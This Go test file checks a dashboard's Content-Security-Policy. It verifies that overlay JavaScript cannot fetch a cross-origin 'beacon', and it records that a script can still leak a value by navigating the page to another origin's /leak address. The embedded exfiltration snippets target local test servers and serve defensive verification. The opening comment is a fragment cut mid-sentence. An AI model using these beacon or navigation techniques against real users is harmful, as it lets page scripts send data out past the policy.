//go:build !windows

package dashboard

// so an overlaid script cannot make a background request to another origin.
// (It can still navigate the page there: the second test below observes
// that too, so the documents say what the policy does.) That claim lived only in the

import (
	"fmt"
	"net/http"
	"net/http/httptest"

	"testing"
)

func TestOverlayCSPBlocksCrossOriginBeacon(t *testing.T) {
	if testing.Short() {
		t.Skip("browser engines are not run in -short")
	}

	beaconHit := make(chan string, 4)
	evild := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		select {
		case beaconHit <- "hit:" + r.URL.Path:
		default:
		}
		w.WriteHeader(200)
	}))
	defer evild.Close()

	overlayModule := fmt.Sprintf(`
export async function attemptBeacon() {
  try {
    const res = await fetch(%q, { mode: 'no-cors' });
    return 'fetched:' + res.type;
  } catch (e) {
    return 'refused:' + (e && e.message ? e.message.slice(0, 60) : String(e));
  }
}
`, evild.URL+"/leak")

	probeModule := `
import { report } from '/__harness.js';
import { attemptBeacon } from '/custom.js';
const out = await attemptBeacon();
if (out.startsWith('refused:')) {
  report('OK');
} else {
  report('FAIL beacon-was-not-refused: ' + out);
}
`

	verdictPage := `<!doctype html><html><head><meta charset="utf-8"></head><body>
<script type="module" src="/probe.js"></script>
</body></html>`

	controlPage := `<!doctype html><html><head><meta charset="utf-8"></head><body>
<script type="module" src="/probe-allow.js"></script>
</body></html>`

	probeAllowModule := `
import { report } from '/__harness.js';
import { attemptBeacon } from '/custom.js';
const out = await attemptBeacon();
if (out.startsWith('fetched:')) {
  report('OK');
} else {
  report('FAIL beacon-was-refused-without-CSP: ' + out);
}
`

	modules := map[string][]byte{
		"/custom.js":      []byte(overlayModule),
		"/probe.js":       []byte(probeModule),
		"/probe-allow.js": []byte(probeAllowModule),
	}

	t.Run("under-uiCSP-beacon-refused", func(t *testing.T) {
		runPageInEnginesWithHeaders(t, verdictPage, modules,
			map[string]string{"Content-Security-Policy": uiCSP})
	})

	for {
		select {
		case hit := <-beaconHit:
			t.Errorf("evil origin recorded a beacon despite uiCSP: %s", hit)
		default:
			goto half2
		}
	}

half2:
	t.Run("no-CSP-beacon-succeeds", func(t *testing.T) {
		runPageInEnginesWithHeaders(t, controlPage, modules, nil)
	})
}

// THE POLICY DOES NOT GOVERN NAVIGATION, and this observes it. Three
// documents and a comment said overlay code "cannot beacon out", on the
// strength of the fetch refusal above. No directive of uiCSP applies to a
// document that sends itself to another address, and no shipping browser
// has one. An overlaid script under the REAL policy assigns location to a
// second local origin with a value in the address, and the request arrives.
//
// This test passing is the limitation, not a property to keep: if a policy
// ever does stop it, this fails, and the documents change with it.
func TestThePagePolicyDoesNotStopANavigationThatCarriesAValue(t *testing.T) {
	if testing.Short() {
		t.Skip("browser engines are not run in -short")
	}
	arrived := make(chan string, 4)
	elsewhere := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		select {
		case arrived <- r.URL.Query().Get("carried"):
		default:
		}
		// The page it lands on tells the rig it got here; this origin
		// sends no policy.
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		fmt.Fprint(w, `<!doctype html><script>fetch(new URLSearchParams(location.search).get('rig') + '/__result', { method: 'POST', mode: 'no-cors', body: 'OK' });</script>`)
	}))
	defer elsewhere.Close()

	overlayModule := fmt.Sprintf(`
const carried = 'what-the-page-could-read';
location.assign(%q + '?carried=' + carried + '&rig=' + encodeURIComponent(location.origin));
`, elsewhere.URL+"/leak")
	page := `<!doctype html><html><head><meta charset="utf-8"></head><body>
<script type="module" src="/custom.js"></script>
</body></html>`
	runPageInEnginesWithHeaders(t, page, map[string][]byte{"/custom.js": []byte(overlayModule)},
		map[string]string{"Content-Security-Policy": uiCSP})
	select {
	case got := <-arrived:
		if got != "what-the-page-could-read" {
			t.Fatalf("the other origin received %q, want the value the script put in the address", got)
		}
	default:
		t.Fatal("no request reached the other origin: the rig reported without the navigation")
	}
}
